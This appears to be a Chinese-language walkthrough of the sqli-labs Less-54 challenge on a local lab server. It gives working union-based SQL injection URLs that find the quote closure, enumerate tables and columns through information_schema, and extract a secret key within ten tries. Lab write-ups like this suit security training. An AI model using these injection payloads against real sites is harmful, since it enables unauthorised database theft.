---
title: Less - 54
date: 2023-03-24T13:13:16Z
lastmod: 2023-03-24T13:27:54Z
---

# Less - 54

---

# 通关教程

---

## 1、判断闭合

---

​![image](assets/image-20230324131452-qhd88vc.png)​

我们需要在10次之内拿到KEY，不然KEY就会重置，就很接近现实里的SQL注入漏洞了，一般CTF的题目也是通过这种方式来考察的

```http
http://192.168.23.128/sqli-labs/Less-54/?id=1
```

​![image](assets/image-20230324131714-lj8ncdc.png)​

```http
http://192.168.23.128/sqli-labs/Less-54/?id=1'
```

​![image](assets/image-20230324131756-491b053.png)​

没有错误回显，所以只能去猜闭合方式了。这里因为只有十次机会，如果猜解的次数超过了十次，回到sqli-labs的主页面点击Setup/reset Database for labs重置一下sqli-labs就行了。

```http
http://192.168.23.128/sqli-labs/Less-54/?id=1'--+
```

​![image](assets/image-20230324132036-24jgrlj.png)​

---

## 2、查看当前库

---

```http
http://192.168.23.128/sqli-labs/Less-54/?id=-1' union select 1,2,database()--+
```

​![image](assets/image-20230324132130-u2a3ecg.png)​

---

## 3、查看challenges库下的所有表

---

```http
http://192.168.23.128/sqli-labs/Less-54/?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')--+
```

​​![image](assets/image-20230324132335-at57vy7.png)​​

---

## 4、查看8o6jkiwiul表下的所有字段

---

```http
http://192.168.23.128/sqli-labs/Less-54/?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='8o6jkiwiul')--+
```

​![image](assets/image-20230324132436-w03kxpy.png)​

---

## 5、查询secret_XV74字段下的值

---

```http
http://192.168.23.128/sqli-labs/Less-54/?id=-1' union select 1,2,(select group_concat(secret_XV74) from challenges.8o6jkiwiul)--+
```

​![image](assets/image-20230324132708-hdi4wix.png)​

将我们得到KEY提交到窗口就可以了

​![image](assets/image-20230324132754-j3syuut.png)​

---
